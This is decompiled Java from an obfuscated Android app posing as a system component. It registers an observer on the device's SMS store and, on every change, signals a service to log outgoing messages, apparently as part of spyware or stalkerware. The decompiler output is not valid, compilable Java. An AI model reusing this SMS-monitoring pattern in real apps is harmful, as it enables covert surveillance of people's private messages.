package com.app.system.common.c;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import com.app.system.common.service.EventsAndReceiveService;

public class f
  extends d
{
  public void a(Context paramContext)
  {
    b(paramContext);
  }
  
  public void b(final Context paramContext)
  {
    if (this.a == null)
    {
      this.a = new ContentObserver(null)
      {
        public void onChange(boolean paramAnonymousBoolean)
        {
          try
          {
            Thread localThread = new java/lang/Thread;
            a locala = new com/app/system/common/c/f$1$a;
            locala.<init>(this);
            localThread.<init>(locala);
            localThread.start();
          }
          catch (Exception localException)
          {
            com.security.d.a.d("ContentObserverForSms", localException.getMessage(), new Object[0]);
          }
        }
        
        class a
          implements Runnable
        {
          a() {}
          
          public void run()
          {
            try
            {
              Intent localIntent = new android/content/Intent;
              localIntent.<init>(f.1.this.a, EventsAndReceiveService.class);
              localIntent.putExtra("event_core_app", "event_sms_outgoing_log");
              com.b.a.a.a.a(f.1.this.a, localIntent);
              return;
            }
            catch (Exception localException)
            {
              for (;;) {}
            }
          }
        }
      };
      paramContext.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, this.a);
    }
  }
  
  public void c(Context paramContext)
  {
    paramContext.getContentResolver().unregisterContentObserver(this.a);
    this.a = null;
  }
}


/* Location:              ~/com/app/system/common/c/f.class
 *
 * Reversed by:           J
 */